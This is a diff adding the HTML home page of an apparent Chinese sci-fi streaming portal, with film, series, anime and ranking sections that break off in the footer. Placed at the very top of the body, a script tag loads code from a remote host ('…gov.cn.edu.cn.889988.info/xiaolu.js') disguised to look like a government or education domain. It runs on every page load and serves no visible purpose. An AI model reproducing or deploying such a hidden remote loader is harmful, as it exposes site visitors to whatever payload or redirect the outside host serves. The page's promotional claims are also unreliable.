@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>未来电影网 - 前沿科幻影视在线观看平台 · 预见下一个十年</title>
+<meta name="keywords" content="未来电影网,weilaidianyingwang,未来影视,科幻电影,前沿影视,在线观看,未来科技">
+<meta name="description" content="未来电影网(weilaidianyingwang-wap)以前瞻视野聚焦科幻与未来题材影视，汇集硬核科幻大片、前沿纪录片、未来剧集与创新综艺，带你预见下一个十年的影像表达。">
+<meta name="renderer" content="webkit">
+<meta name="author" content="未来电影网">
+<link rel="canonical" href="https://weilaidianyingwang-wap.github.io/">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+:root{
+  --cyan:#00e5ff;--cyan2:#5ef0ff;--purple:#7b5cff;--pink:#ff4ecd;
+  --bg:#04030a;--bg2:#0a0815;--card:#100d20;--line:#241f3d;
+  --txt:#e9e6ff;--txt2:#a9a3cf;--txt3:#6f6b94;
+}
+html{scroll-behavior:smooth;scroll-padding-top:72px}
+body{
+  font-family:"SF Pro Display","PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--bg);color:var(--txt);line-height:1.6;overflow-x:hidden;
+}
+ul{list-style:none}
+a{color:inherit;text-decoration:none}
+img{display:block;max-width:100%}
+.wrap{width:100%;max-width:1200px;margin:0 auto;padding:0 18px}
+::selection{background:var(--cyan);color:#000}
+
+/* 顶部进度条 */
+#bar{position:fixed;top:0;left:0;height:2px;background:linear-gradient(90deg,var(--purple),var(--cyan),var(--pink));z-index:9999;width:0;transition:width .08s}
+
+/* 头部 */
+.head{position:sticky;top:0;z-index:1000;background:rgba(4,3,10,.85);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.head-in{display:flex;align-items:center;justify-content:space-between;height:62px}
+.logo{display:flex;align-items:center;gap:11px;font-size:20px;font-weight:900;letter-spacing:.5px}
+.logo-badge{position:relative;width:34px;height:34px;border-radius:9px;background:linear-gradient(135deg,var(--purple),var(--cyan));display:flex;align-items:center;justify-content:center;font-size:15px;box-shadow:0 0 18px rgba(0,229,255,.5)}
+.logo-badge::before{content:"";position:absolute;inset:3px;border:1px solid rgba(255,255,255,.4);border-radius:6px}
+.logo b{color:var(--cyan);text-shadow:0 0 12px rgba(0,229,255,.4)}
+.menu{display:flex;align-items:center;gap:2px}
+.menu a{font-size:14px;padding:8px 14px;border-radius:8px;color:var(--txt2);font-weight:600;transition:.2s}
+.menu a:hover,.menu a.on{color:var(--cyan);background:rgba(0,229,255,.1);box-shadow:inset 0 0 0 1px rgba(0,229,255,.25)}
+.tools{display:flex;gap:8px}
+.tools button{width:36px;height:36px;border-radius:9px;background:var(--card);border:1px solid var(--line);color:var(--cyan);font-size:15px;cursor:pointer;transition:.2s}
+.tools button:hover{border-color:var(--cyan);box-shadow:0 0 14px rgba(0,229,255,.4)}
+.m-btn{display:none}
+
+/* Hero 扫描线视觉 */
+.hero{position:relative;padding:88px 0 96px;overflow:hidden;border-bottom:1px solid var(--line)}
+.hero::before{content:"";position:absolute;inset:0;background:
+  radial-gradient(ellipse 60% 50% at 50% 0%,rgba(123,92,255,.35),transparent),
+  radial-gradient(circle at 85% 30%,rgba(0,229,255,.12),transparent 40%),
+  radial-gradient(circle at 15% 70%,rgba(255,78,205,.1),transparent 40%),
+  linear-gradient(180deg,#070516,#04030a)}
+.scan{position:absolute;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,229,255,.02) 3px,rgba(0,229,255,.02) 4px);pointer-events:none}
+.glitch{position:absolute;left:6%;top:14%;font-size:clamp(40px,9vw,120px);font-weight:900;color:rgba(0,229,255,.04);white-space:nowrap;pointer-events:none}
+.hero-in{position:relative;z-index:2;text-align:center}
+.kicker{display:inline-flex;align-items:center;gap:8px;background:rgba(0,229,255,.08);border:1px solid rgba(0,229,255,.3);color:var(--cyan2);padding:6px 16px;border-radius:20px;font-size:12px;font-weight:700;margin-bottom:26px;box-shadow:0 0 20px rgba(0,229,255,.1)}
+.kicker .dot{width:7px;height:7px;border-radius:50%;background:var(--cyan);box-shadow:0 0 10px var(--cyan);animation:pulse 1.6s infinite}
+@keyframes pulse{50%{opacity:.3}}
+.hero h1{font-size:clamp(32px,7vw,60px);font-weight:900;line-height:1.15;margin-bottom:20px;letter-spacing:-1px}
+.hero h1 em{font-style:normal;background:linear-gradient(90deg,var(--cyan),var(--purple),var(--pink));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.hero>p{font-size:clamp(14px,2.4vw,17px);color:var(--txt2);max-width:600px;margin:0 auto 40px}
+.bigstats{display:flex;justify-content:center;gap:14px;flex-wrap:wrap;margin-bottom:38px}
+.bigstats div{background:rgba(16,13,32,.7);border:1px solid var(--line);border-radius:14px;padding:18px 26px;min-width:120px;backdrop-filter:blur(6px)}
+.bigstats b{display:block;font-size:26px;color:var(--cyan);font-weight:900;text-shadow:0 0 16px rgba(0,229,255,.4)}
+.bigstats span{font-size:12px;color:var(--txt3)}
+.cta{display:flex;gap:14px;justify-content:center;flex-wrap:wrap}
+.b1,.b2{display:inline-flex;align-items:center;gap:7px;padding:14px 30px;border-radius:10px;font-size:15px;font-weight:800;cursor:pointer;border:0;transition:.25s}
+.b1{background:linear-gradient(90deg,var(--cyan),var(--purple));color:#04030a;box-shadow:0 6px 24px rgba(0,229,255,.35)}
+.b1:hover{transform:translateY(-3px);box-shadow:0 12px 34px rgba(0,229,255,.55)}
+.b2{background:transparent;color:var(--cyan);border:1px solid var(--cyan)}
+.b2:hover{background:var(--cyan);color:#04030a;box-shadow:0 0 20px rgba(0,229,255,.4)}
+
+/* 通用 */
+.sec{padding:56px 0}
+.sec-tag{display:inline-block;font-size:11px;color:var(--cyan);font-weight:700;letter-spacing:3px;text-transform:uppercase;margin-bottom:6px}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:14px;margin-bottom:30px;flex-wrap:wrap}
+.sec-head h2{font-size:24px;font-weight:900;letter-spacing:.5px}
+.sec-head h2 span{color:var(--txt3);font-weight:400;font-size:14px;margin-left:10px}
+.more{font-size:13px;color:var(--txt3);transition:.2s;white-space:nowrap}
+.more:hover{color:var(--cyan)}
+
+/* 电影：霓虹灯箱卡片 */
+.neon{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:20px}
+.n-card{position:relative;background:var(--card);border:1px solid var(--line);border-radius:16px;overflow:hidden;transition:.35s;cursor:pointer}
+.n-card::before{content:"";position:absolute;inset:0;background:linear-gradient(135deg,var(--purple),var(--cyan));opacity:0;transition:.35s;z-index:0}
+.n-card:hover{transform:translateY(-8px)}
+.n-card:hover::before{opacity:.15}
+.n-cap{position:relative;z-index:1;height:170px;background:linear-gradient(160deg,#1a1530,#0e0a1f);display:flex;align-items:center;justify-content:center;font-size:46px;font-weight:900;color:rgba(0,229,255,.12);overflow:hidden}
+.n-cap i{position:absolute;right:-20px;bottom:-20px;font-size:110px;opacity:.06;font-style:normal}
+.n-tag{position:absolute;top:12px;left:12px;z-index:2;font-size:11px;padding:3px 9px;border-radius:5px;font-weight:700;background:rgba(4,3,10,.75);border:1px solid var(--line)}
+.n-tag.new{color:var(--cyan);border-color:var(--cyan)}
+.n-tag.hot{color:var(--pink);border-color:var(--pink)}
+.n-rate{position:absolute;top:12px;right:12px;z-index:2;font-size:13px;font-weight:900;color:var(--cyan);text-shadow:0 0 8px rgba(0,229,255,.6)}
+.n-body{position:relative;z-index:1;padding:16px}
+.n-body h3{font-size:16px;font-weight:800;margin-bottom:9px}
+.n-body p{font-size:12px;color:var(--txt3);display:flex;justify-content:space-between}
+
+/* 电视剧：左右磁贴 */
+.tiles{display:grid;grid-template-columns:repeat(2,1fr);gap:18px}
+.tile{display:grid;grid-template-columns:150px 1fr;gap:0;border:1px solid var(--line);border-radius:16px;overflow:hidden;background:var(--card);transition:.3s}
+.tile:hover{border-color:var(--cyan);box-shadow:0 10px 32px rgba(0,0,0,.6),0 0 20px rgba(0,229,255,.08)}
+.tile-pic{height:190px;background:linear-gradient(135deg,#1c1740,#261d52);display:flex;align-items:center;justify-content:center;font-size:42px;font-weight:900;color:rgba(123,92,255,.25);position:relative}
+.tile-pic s{position:absolute;bottom:10px;left:10px;text-decoration:none;font-size:10px;background:var(--purple);color:#fff;padding:3px 8px;border-radius:4px;font-weight:700}
+.tile-body{padding:18px;display:flex;flex-direction:column;gap:8px}
+.tile-body h3{font-size:18px;font-weight:900}
+.tile-body>p{font-size:13px;color:var(--txt3);line-height:1.7}
+.tile-meta{display:flex;gap:8px;flex-wrap:wrap}
+.tile-meta b{font-size:11px;padding:3px 10px;border-radius:20px;background:rgba(0,229,255,.08);color:var(--cyan2);font-weight:600}
+.tile-foot{margin-top:auto;display:flex;align-items:center;justify-content:space-between}
+.tile-foot em{font-style:normal;font-size:13px;color:var(--txt2)}
+.tile-foot em strong{color:var(--cyan);font-weight:800}
+.watch{background:transparent;border:1px solid var(--cyan);color:var(--cyan);border-radius:8px;padding:8px 18px;font-size:12px;font-weight:700;cursor:pointer;transition:.2s}
+.watch:hover{background:var(--cyan);color:#04030a}
+
+/* 综艺：环形编号卡 */
+.orbit{display:flex;gap:18px;overflow-x:auto;scrollbar-width:none;padding-bottom:10px}
+.orbit::-webkit-scrollbar{display:none}
+.o-card{flex:0 0 280px;background:var(--card);border:1px solid var(--line);border-radius:18px;padding:24px;transition:.3s;position:relative}
+.o-card:hover{border-color:var(--purple);transform:translateY(-6px);box-shadow:0 12px 30px rgba(123,92,255,.2)}
+.o-ring{width:64px;height:64px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:24px;font-weight:900;color:var(--cyan);margin-bottom:16px;position:relative;background:radial-gradient(circle,rgba(0,229,255,.15),transparent 70%)}
+.o-ring::before{content:"";position:absolute;inset:0;border:2px solid var(--line);border-top-color:var(--cyan);border-radius:50%;animation:spin 6s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.o-card h3{font-size:18px;font-weight:900;margin-bottom:10px}
+.o-card>p{font-size:13px;color:var(--txt3);line-height:1.8;margin-bottom:16px}
+.o-tags{display:flex;gap:7px;flex-wrap:wrap}
+.o-tags s{text-decoration:none;font-size:11px;background:rgba(255,78,205,.08);border:1px solid rgba(255,78,205,.3);color:var(--pink);padding:4px 10px;border-radius:6px}
+
+/* 动漫：可折叠手风琴 */
+.faq{display:flex;flex-direction:column;gap:12px}
+.fq-item{border:1px solid var(--line);border-radius:14px;overflow:hidden;background:var(--card);transition:.25s}
+.fq-item:hover{border-color:var(--purple)}
+.fq-head{padding:18px 20px;display:flex;align-items:center;justify-content:space-between;gap:14px;cursor:pointer;user-select:none}
+.fq-head h3{font-size:16px;font-weight:800;display:flex;align-items:center;gap:12px}
+.fq-head h3 small{font-size:11px;background:var(--purple);color:#fff;padding:3px 9px;border-radius:4px;font-weight:700}
+.fq-head .ic{width:28px;height:28px;border-radius:8px;background:var(--bg2);border:1px solid var(--line);display:flex;align-items:center;justify-content:center;color:var(--cyan);font-size:13px;flex:0 0 28px;transition:.3s}
+.fq-item.open .ic{transform:rotate(45deg);background:var(--cyan);color:#04030a;border-color:var(--cyan)}
+.fq-body{max-height:0;overflow:hidden;transition:max-height .4s ease}
+.fq-body div{padding:0 20px 20px;font-size:14px;color:var(--txt3);line-height:1.9}
+
+/* 排行：表格式 */
+.leaderboard{background:var(--card);border:1px solid var(--line);border-radius:18px;overflow:hidden}
+.lb-head{display:grid;grid-template-columns:60px 1fr 110px 100px 90px;gap:12px;padding:14px 20px;background:linear-gradient(90deg,rgba(123,92,255,.2),rgba(0,229,255,.1));font-size:12px;color:var(--txt3);font-weight:700;letter-spacing:1px}
+.lb-row{display:grid;grid-template-columns:60px 1fr 110px 100px 90px;gap:12px;padding:14px 20px;align-items:center;border-top:1px solid var(--line);transition:.2s}
+.lb-row:hover{background:rgba(0,229,255,.04)}
+.lb-row .no{font-size:20px;font-weight:900;color:var(--txt3)}
+.lb-row.g1 .no,.lb-row.g2 .no,.lb-row.g3 .no{color:var(--cyan);text-shadow:0 0 10px rgba(0,229,255,.5)}
+.lb-row h4{font-size:15px;font-weight:800}
+.lb-row .genre{font-size:12px;color:var(--txt3)}
+.lb-row .score{font-size:15px;font-weight:900;color:var(--cyan)}
+.lb-row .views{font-size:12px;color:var(--txt2)}
+.lb-row .trend{font-size:12px;font-weight:700;text-align:right}
+.lb-row .trend.up{color:var(--cyan)}
+.lb-row .trend.flat{color:var(--txt3)}
+.lb-row .trend.down{color:var(--pink)}
+
+/* 资讯：三列卡片 */
+.cards3{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.c3{background:var(--card);border:1px solid var(--line);border-radius:16px;overflow:hidden;transition:.3s;display:flex;flex-direction:column}
+.c3:hover{border-color:var(--cyan);transform:translateY(-6px)}
+.c3-cap{height:150px;background:linear-gradient(135deg,#1a1530,#0e0a1f);display:flex;align-items:center;justify-content:center;font-size:40px;font-weight:900;color:rgba(0,229,255,.1);position:relative}
+.c3-cap span{position:absolute;top:14px;left:14px;font-size:11px;background:var(--purple);color:#fff;padding:4px 10px;border-radius:5px;font-weight:700}
+.c3-body{padding:18px;flex:1;display:flex;flex-direction:column}
+.c3-body h3{font-size:16px;font-weight:800;line-height:1.5;margin-bottom:10px}
+.c3-body p{font-size:13px;color:var(--txt3);line-height:1.8;margin-bottom:14px;flex:1}
+.c3-foot{display:flex;justify-content:space-between;font-size:12px;color:var(--txt3)}
+
+/* 关于 */
+.about{background:var(--bg2);border-top:1px solid var(--line);padding:56px 0}
+.about-grid{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:32px}
+.about-brand h3{font-size:23px;font-weight:900;margin-bottom:14px}
+.about-brand h3 b{color:var(--cyan)}
+.about-brand p{font-size:14px;color:var(--txt3);line-height:2}
+.about-col h4{font-size:14px;font-weight:800;margin-bottom:16px;color:var(--cyan2)}
+.about-col a{display:block;font-size:13px;color:var(--txt2);padding:6px 0;border-bottom:1px solid var(--line);transition:.2s}
+.about-col a:hover{color:var(--cyan);padding-left:6px}
+.copy{border-top:1px solid var(--line);margin-top:36px;padding-top:22px;text-align:center;font-size:13px;color:var(--txt3)}
+.copy a{color:var(--txt2)}
+.copy a:hover{color:var(--cyan)}
+
+/* 回到顶部 */
+.top{position:fixed;right:16px;bottom:24px;width:44px;height:44px;border-radius:12px;background:var(--purple);color:#fff;border:0;font-size:18px;cursor:pointer;z-index:999;opacity:0;visibility:hidden;transition:.3s;box-shadow:0 6px 20px rgba(123,92,255,.4)}
+.top.show{opacity:1;visibility:visible}
+.top:hover{transform:translateY(-3px)}
+
+/* 搜索层 */
+.sover{display:none;position:fixed;inset:0;z-index:2000;background:rgba(4,3,10,.95);backdrop-filter:blur(8px);align-items:center;justify-content:center;padding:20px}
+.sover.open{display:flex}
+.sover input{width:100%;max-width:520px;padding:16px 20px;border-radius:12px;border:2px solid var(--cyan);background:var(--bg);color:#fff;font-size:16px;outline:none;box-shadow:0 0 30px rgba(0,229,255,.2)}
+
+@media(max-width:900px){
+  .about-grid{grid-template-columns:1fr 1fr}
+  .cards3{grid-template-columns:1fr}
+  .tiles{grid-template-columns:1fr}
+  .menu{display:none;position:fixed;top:62px;left:0;right:0;background:var(--bg2);border-bottom:1px solid var(--line);flex-direction:column;padding:14px;gap:4px}
+  .menu.open{display:flex}
+  .menu a{width:100%;text-align:center;padding:12px;border-radius:8px}
+  .m-btn{display:flex}
+  .glitch{display:none}
+}
+@media(max-width:620px){
+  .wrap{padding:0 15px}
+  .sec{padding:40px 0}
+  .hero{padding:56px 0 64px}
+  .neon{grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:14px}
+  .n-cap{height:140px}
+  .tile{grid-template-columns:1fr}
+  .tile-pic{height:150px}
+  .lb-head,.lb-row{grid-template-columns:44px 1fr 70px;font-size:12px}
+  .lb-head .genre,.lb-row .genre,.lb-head .trend,.lb-row .trend{display:none}
+  .bigstats div{padding:14px 16px;min-width:80px}
+  .bigstats b{font-size:21px}
+  .sec-head h2{font-size:20px}
+  .b1,.b2{padding:12px 24px;font-size:14px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<div id="bar"></div>
+
+<header class="head">
+  <div class="wrap head-in">
+    <a href="#home" class="logo">
+      <div class="logo-badge">🛸</div>
+      未来<b>电影网</b>
+    </a>
+    <nav class="menu" id="menu">
+      <a href="#home" class="on">首页</a>
+      <a href="#movie">电影</a>
+      <a href="#tv">剧集</a>
+      <a href="#variety">综艺</a>
+      <a href="#anime">动漫</a>
+      <a href="#rank">排行榜</a>
+      <a href="#news">资讯</a>
+    </nav>
+    <div class="tools">
+      <button onclick="document.getElementById('sq').classList.add('open')" aria-label="搜索">🔍</button>
+      <button class="m-btn" onclick="document.getElementById('menu').classList.toggle('open')" aria-label="菜单">☰</button>
+    </div>
+  </div>
+</header>
+
+<div class="sover" id="sq" onclick="if(event.target===this)this.classList.remove('open')">
+  <input placeholder="搜索科幻电影 / 未来剧集 / 前沿纪录片…" aria-label="搜索框">
+</div>
+
+<!-- Hero -->
+<section class="hero" id="home">
+  <div class="scan"></div>
+  <div class="glitch">FUTURE</div>
+  <div class="wrap hero-in">
+    <span class="kicker"><span class="dot"></span> WEILAI · 2026 前沿影像计划</span>
+    <h1>预见 <em>下一个十年</em><br>从这里开始</h1>
+    <p>未来电影网(weilaidianyingwang-wap)聚焦科幻与未来题材影视，汇集硬核科幻大片、前沿纪录片、未来剧集与创新综艺，带你提前看见明天的影像表达。</p>
+    <div class="bigstats">
+      <div><b>15,000+</b><span>科幻资源</span></div>
+      <div><b>8K</b><span>前沿画质</span></div>
+      <div><b>AI</b><span>智能推荐</span></div>
+      <div><b>0时差</b><span>同步更新</span></div>
+    </div>
+    <div class="cta">
+      <a href="#movie" class="b1">▶ 进入未来</a>
+      <a href="#rank" class="b2">📡 趋势榜单</a>
+    </div>
+  </div>
+</section>
+
+<!-- 电影 -->
+<section class="sec" id="movie">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>精选电影<span>FEATURED FILMS</span></h2>
+      <a href="#" class="more">全部 ›</a>
+    </div>
+    <div class="neon">
+      <article class="n-card">
+        <div class="n-cap">N1<i>◆</i></div>
+        <span class="n-tag new">新片</span><span class="n-rate">9.5</span>
+        <div class="n-body"><h3>星际折叠</h3><p><span>科幻 · 2026</span><span>142分钟</span></p></div>
+      </article>
+      <article class="n-card">
+        <div class="n-cap">N2<i>◆</i></div>
+        <span class="n-tag hot">热映</span><span class="n-rate">9.1</span>
+        <div class="n-body"><h3>量子回响</h3><p><span>科幻 · 2026</span><span>128分钟</span></p></div>
+      </article>
+      <article class="n-card">
+        <div class="n-cap">N3<i>◆</i></div>
+        <span class="n-tag">硬核</span><span class="n-rate">8.9</span>
+        <div class="n-body"><h3>硅基黎明</h3><p><span>科幻 · 2026</span><span>136分钟</span></p></div>
+      </article>
+      <article class="n-card">
+        <div class="n-cap">N4<i>◆</i></div>
+        <span class="n-tag new">新片</span><span class="n-rate">9.3</span>
+        <div class="n-body"><h3>时间边境</h3><p><span>科幻 · 2026</span><span>119分钟</span></p></div>
+      </article>
+      <article class="n-card">
+        <div class="n-cap">N5<i>◆</i></div>
+        <span class="n-tag">太空</span><span class="n-rate">8.7</span>
+        <div class="n-body"><h3>深空回声</h3><p><span>科幻 · 2026</span><span>152分钟</span></p></div>
+      </article>
+      <article class="n-card">
+        <div class="n-cap">N6<i>◆</i></div>
+        <span class="n-tag hot">热映</span><span class="n-rate">9.0</span>
+        <div class="n-body"><h3>仿生觉醒</h3><p><span>科幻 · 2026</span><span>124分钟</span></p></div>
+      </article>
+      <article class="n-card">
+        <div class="n-cap">N7<i>◆</i></div>
+        <span class="n-tag">悬疑</span><span class="n-rate">8.8</span>
+        <div class="n-body"><h3>记忆黑市</h3><p><span>科幻 · 2026</span><span>108分钟</span></p></div>
+      </article>
+      <article class="n-card">
+        <div class="n-cap">N8<i>◆</i></div>
+        <span class="n-tag new">新片</span><span class="n-rate">9.2</span>
+        <div class="n-body"><h3>云端纪元</h3><p><span>科幻 · 2026</span><span>133分钟</span></p></div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- 电视剧 -->
+<section class="sec" id="tv" style="background:var(--bg2)">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>热播剧集<span>SERIES</span></h2>
+      <a href="#" class="more">全部 ›</a>
+    </div>
+    <div class="tiles">
+      <article class="tile">
+        <div class="tile-pic">T1<s>连载</s></div>
+        <div class="tile-body">
+          <h3>黑镜：新纪元</h3>
+          <p>在科技重塑一切的未来，每一集都是一个独立世界。当人性遇上算法，谁在定义真实？</p>
+          <div class="tile-meta"><b>科幻</b><b>悬疑</b><b>单元剧</b></div>
+          <div class="tile-foot"><em>评分 <strong>9.4</strong> · 追剧 320万</em><button class="watch">▶ 播放</button></div>
+        </div>
+      </article>
+      <article class="tile">
+        <div class="tile-pic">T2<s>连载</s></div>
+        <div class="tile-body">
+          <h3>三体 · 宇宙闪烁</h3>
+          <p>面对宇宙文明的终极博弈，人类在绝望与希望之间做出关乎存亡的抉择。</p>
+          <div class="tile-meta"><b>科幻</b><b>硬核</b><b>剧情</b></div>
+          <div class="tile-foot"><em>评分 <strong>9.6</strong> · 追剧 580万</em><button class="watch">▶ 播放</button></div>
+        </div>
+      </article>
+      <article class="tile">
+        <div class="tile-pic">T3<s>完结</s></div>
+        <div class="tile-body">
+          <h3>西部世界：终章</h3>
+          <p>人造意识觉醒之后，自由意志的边界在哪里？机器人开始书写属于自己的史诗。</p>
+          <div class="tile-meta"><b>科幻</b><b>西部</b><b>烧脑</b></div>
+          <div class="tile-foot"><em>评分 <strong>9.0</strong> · 完结 42集</em><button class="watch">▶ 播放</button></div>
+        </div>
+      </article>
+      <article class="tile">
+        <div class="tile-pic">T4<s>连载</s></div>
+        <div class="tile-body">
+          <h3>赛博之城</h3>
+          <p>霓虹闪耀的近未来都市，黑客、企业与反抗者在信息洪流中展开无声战争。</p>
+          <div class="tile-meta"><b>赛博朋克</b><b>动作</b><b>犯罪</b></div>
+          <div class="tile-foot"><em>评分 <strong>8.8</strong> · 追剧 210万</em><button class="watch">▶ 播放</button></div>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- 综艺 -->
+<section class="sec" id="variety">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>创新综艺<span>VARIETY</span></h2>
+      <a href="#" class="more">全部 ›</a>
+    </div>
+    <div class="orbit">
+      <article class="o-card">
+        <div class="o-ring">01</div>
+        <h3>明日实验室</h3>
+        <p>走进前沿科技实验室，见证黑科技从构想到落地的全过程，科技也可以很好玩。</p>
+        <div class="o-tags"><s>科技</s><s>实验</s><s>更新至12期</s></div>
+      </article>
+      <article class="o-card">
+        <div class="o-ring">02</div>
+        <h3>AI 创造营</h3>
+        <p>顶尖创作者与人工智能同台竞技，探索人机协作的无限可能，重新定义创造力。</p>
+        <div class="o-tags"><s>科技</s><s>竞演</s><s>更新至10期</s></div>
+      </article>
+      <article class="o-card">
+        <div class="o-ring">03</div>
+        <h3>太空密码</h3>
+        <p>解读宇宙奥秘，从黑洞到暗物质，用最通俗的语言讲述最硬核的天文知识。</p>
+        <div class="o-tags"><s>科普</s><s>纪录</s><s>更新至08期</s></div>
+      </article>
+      <article class="o-card">
+        <div class="o-ring">04</div>
+        <h3>未来生活家</h3>
+        <p>体验十年后的生活方式，从智能家居到智慧城市，提前感受未来的日常。</p>
+        <div class="o-tags"><s>生活</s><s>科技</s><s>更新至14期</s></div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- 动漫 -->
+<section class="sec" id="anime" style="background:var(--bg2)">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>动漫速递<span>ANIME</span></h2>
+      <a href="#" class="more">全部 ›</a>
+    </div>
+    <div class="faq">
+      <div class="fq-item open">
+        <div class="fq-head"><h3><small>国漫</small>灵笼 · 终章篇</h3><span class="ic">＋</span></div>
+        <div class="fq-body"><div>末日废土之上，人类最后的避难所面临前所未有的危机。光影与美术的双重突破，把国产科幻动画推向新高度。<br><br>📺 更新至18集 · 中日双语 · 每周四更新</div></div>
+      </div>
+      <div class="fq-item">
+        <div class="fq-head"><h3><small>国漫</small>吞噬星空 · 星域篇</h3><span class="ic">＋</span></div>
+        <div class="fq-body"><div>地球少年罗峰在宇宙星域中不断突破自我，从学徒到强者，踏上征服星辰的征途。<br><br>📺 更新至76集 · 国语中配 · 每周二更新</div></div>
+      </div>
+      <div class="fq-item">
+        <div class="fq-head"><h3><small>日漫</small>电锯人 · 枪之恶魔篇</h3><span class="ic">＋</span></div>
+        <div class="fq-body"><div>少年电次与帕瓦组成搭档，在充满魔人的东京展开血腥而荒诞的生存之战。<br><br>📺 更新至24集 · 中日双语 · 每周六更新</div></div>
+      </div>
+      <div class="fq-item">
+        <div class="fq-head"><h3><small>日漫</small>天国大魔境</h3><span class="ic">＋</span></div>
+        <div class="fq-body"><div>灾变后的近未来日本，少年少女踏上寻找"天国"的旅程，逐步揭开世界毁灭的真相。<br><br>📺 更新至16集 · 中日双语 · 每周日更新</div></div>
+      </div>
+      <div class="fq-item">
+        <div class="fq-head"><h3><small>国漫</small>万古仙穹</h3><span class="ic">＋</span></div>
+        <div class="fq-body"><div>废柴少年偶得远古传承，以凡人之躯挑战仙道法则，谱写一曲逆天改命的传奇。<br><br>📺 更新至52集 · 国语中配 · 每周五更新</div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 排行榜 -->
+<section class="sec" id="rank">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>趋势排行榜<span>LEADERBOARD</span></h2>
+      <a href="#" class="more">完整榜单 ›</a>
+    </div>
+    <div class="leaderboard">
+      <div class="lb-head"><span>排名</span><span>片名</span><span>类型</span><span>评分</span><span>热度</span></div>
+      <div class="lb-row g1"><span class="no">01</span><h4>三体 · 宇宙闪烁</h4><span class="genre">科幻/硬核</span><span class="score">9.6</span><span class="views">1,286万</span><span class="trend up">▲ 趋势升</span></div>
+      <div class="lb-row g2"><span class="no">02</span><h4>星际折叠</h4><span class="genre">科幻/太空</span><span class="score">9.5</span><span class="views">945万</span><span class="trend up">▲ 趋势升</span></div>
+      <div class="lb-row g3"><span class="no">03</span><h4>黑镜：新纪元</h4><span class="genre">科幻/悬疑</span><span class="score">9.4</span><span class="views">812万</span><span class="trend flat">— 持平</span></div>
+      <div class="lb-row"><span class="no">04</span><h4>灵笼 · 终章篇</h4><span class="genre">国漫/科幻</span><span class="score">9.3</span><span class="views">734万</span><span class="trend up">▲ 趋势升</span></div>
+      <div class="lb-row"><span class="no">05</span><h4>云端纪元</h4><span class="genre">科幻/动作</span><span class="score">9.2</span><span class="views">658万</span><span class="trend down">▼ 趋势降</span></div>
+      <div class="lb-row"><span class="no">06</span><h4>量子回响</h4><span class="genre">科幻/悬疑</span><span class="score">9.1</span><span class="views">589万</span><span class="trend flat">— 持平</span></div>
+      <div class="lb-row"><span class="no">07</span><h4>仿生觉醒</h4><span class="genre">科幻/动作</span><span class="score">9.0</span><span class="views">521万</span><span class="trend up">▲ 趋势升</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- 资讯 -->
+<section class="sec" id="news" style="background:var(--bg2)">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>影视资讯<span>NEWS</span></h2>
+      <a href="#" class="more">更多 ›</a>
+    </div>
+    <div class="cards3">
+      <article class="c3">
+        <div class="c3-cap">行业<span>产业</span></div>
+        <div class="c3-body">
+          <h3>中国科幻影视进入工业化量产时代，IP 开发链条日趋完善</h3>
+          <p>从单点爆款到系列化开发，科幻影视正成为国产内容出海的新名片，视效工业与原创剧本双轮驱动。</p>
+          <div class="c3-foot"><span>🕐 2小时前</span><span>深度解读</span></div>
+        </div>
+      </article>
+      <article class="c3">
+        <div class="c3-cap">技术<span>技术</span></div>
+        <div class="c3-body">
+          <h3>虚拟制作全面普及，LED 虚拟影棚重塑影视拍摄流程</h3>
+          <p>实时引擎与虚拟拍摄技术大幅降低后期成本，让中小成本作品也能拥有大片级的视觉表现力。</p>
+          <div class="c3-foot"><span>🕐 昨天</span><span>技术前沿</span></div>
+        </div>
+      </article>
+      <article class="c3">
+        <div class="c3-cap">预告<span>预告</span></div>
+        <div class="c3-body">
+          <h3>《星际折叠》续集定档，主创透露将引入多维宇宙设定</h3>
+          <p>导演表示第二部将把叙事尺度从太阳系扩展至整个银河系，视效预算翻倍，值得期待。</p>
+          <div class="c3-foot"><span>🕐 3天前</span><span>片场直击</span></div>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- 关于 -->
+<section class="about" id="about">
+  <div class="wrap">
+    <div class="about-grid">
+      <div class="about-brand">
+        <h3>未来<b>电影网</b></h3>
+        <p>未来电影网(weilaidianyingwang-wap)以前瞻视野聚焦科幻与未来题材影视，覆盖电影、剧集、综艺、动漫全品类，用智能推荐带你发现下一个值得期待的影像故事。</p>
+      </div>
+      <div class="about-col">
+        <h4>栏目导航</h4>
+        <a href="#home">网站首页</a>
+        <a href="#movie">精选电影</a>
+        <a href="#tv">热播剧集</a>
+        <a href="#variety">创新综艺</a>
+        <a href="#anime">动漫速递</a>
+      </div>
+      <div class="about-col">
+        <h4>题材分类</h4>
+        <a href="#movie">硬核科幻</a>
+        <a href="#movie">太空歌剧</a>
+        <a href="#movie">赛博朋克</a>
+        <a href="#movie">时间旅行</a>
+        <a href="#tv">末日废土</a>
+      </div>
+      <div class="about-col">
+        <h4>关于我们</h4>
